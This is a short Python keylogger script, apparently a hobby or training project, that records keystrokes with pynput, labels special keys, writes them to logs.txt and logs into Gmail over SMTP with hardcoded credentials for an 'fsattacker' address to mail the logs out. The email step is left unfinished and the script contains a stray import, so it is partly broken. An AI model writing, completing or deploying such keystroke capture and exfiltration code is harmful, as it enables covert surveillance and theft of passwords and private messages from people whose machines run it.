import smtplib
from time import time
from isort import file
from pynput.keyboard import Listener
from datetime import datetime

count = 0
keys = []

sender_email = "fsattacker247@gmail.com"
sender_password = "FS123456789"
reciever_email = "fsattacker247@gmail.com"

# Define a keystroke 
def keystroke(key):
    global keys, count
    key = str(key).replace("'", "")

    # Create rules for special characters (keys with Powers)
    # We could create a dictionary here
    #specialChar = {'Key.space':'[SPACE]', ...}
    if key == 'Key.space':
        key = '[SPACE]'
    
    if key == "Key.shift_r":
        key = "[SHIFT RIGHT]"
    
    if key == "Key.tab":
        key = "[TAB]"

    if key == "Key.enter":
        key = "[ENTER]"

    if key == "Key.backspace":
        key = "[BACKSPACE]"
    
    if key == "Key.caps_lock":
        key = "[CAPS LOCK]"

    print (key)
    keys.append(key)
    count += 1

    if count > 10:
        write_file(keys)
        count = 0
        keys = []

def write_file(logs):
    with open("logs.txt", "a") as file:
        for key in logs:
            file.write(str(key))

# filename = "C:/Users/bradl/OneDrive/Folder/Git/logs.txt"
# with open(filename, 'rb') as f:
#     file_data = f.read()
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(sender_email, sender_password)
server.sendmail(sender_email, reciever_email, #msg)


with Listener(on_press=keystroke) as listener:
    listener.join()